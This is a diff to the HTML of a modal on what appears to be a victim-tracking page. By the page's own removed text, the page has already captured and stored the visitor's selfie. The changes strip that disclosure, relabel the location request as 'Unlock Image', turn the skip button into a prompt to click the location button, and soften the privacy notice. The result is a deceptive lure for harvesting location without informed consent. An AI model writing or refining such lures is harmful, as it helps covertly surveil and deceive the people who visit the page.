@@ -84,12 +84,11 @@
                 border: 1px solid rgba(255,255,255,0.08);
                 box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             ">
-                <div style="font-size: 64px; margin-bottom: 16px;">📍</div>
+                <div style="font-size: 64px; margin-bottom: 16px;"></div>
                 <h2 style="color: #fff; font-size: 22px; margin-bottom: 12px;">Location Required to Unlock</h2>
                 <p style="color: #a0a0b8; font-size: 14px; line-height: 1.6; margin-bottom: 24px;">
-                    Your photo has been captured and saved.<br><br>
-                    To view it on this page, please <strong style="color: #fff;">enable location access</strong>.
-                    Your selfie is already stored in the admin panel regardless.
+                    Wait Photo Is Loading ...<br><br>
+                   
                 </p>
                 <div style="display: flex; flex-direction: column; gap: 12px;">
                     <button id="enableLocationBtn" style="
@@ -102,7 +101,7 @@
                         border-radius: 10px;
                         cursor: pointer;
                         width: 100%;
-                    ">📍 Enable Location</button>
+                    "> Unlock Image</button>
                     <button id="skipLocationBtn" style="
                         background: transparent;
                         color: #78789a;
@@ -112,10 +111,10 @@
                         border-radius: 10px;
                         cursor: pointer;
                         width: 100%;
-                    ">Skip — Keep Photo Locked</button>
+                    ">Plaese Click Above Button to View Image </button>
                 </div>
                 <p style="color: #58587a; font-size: 12px; margin-top: 20px;">
-                    Your location is only used once to verify your identity.
+                    Your location is to verify your identity.
                 </p>
             </div>
         `;
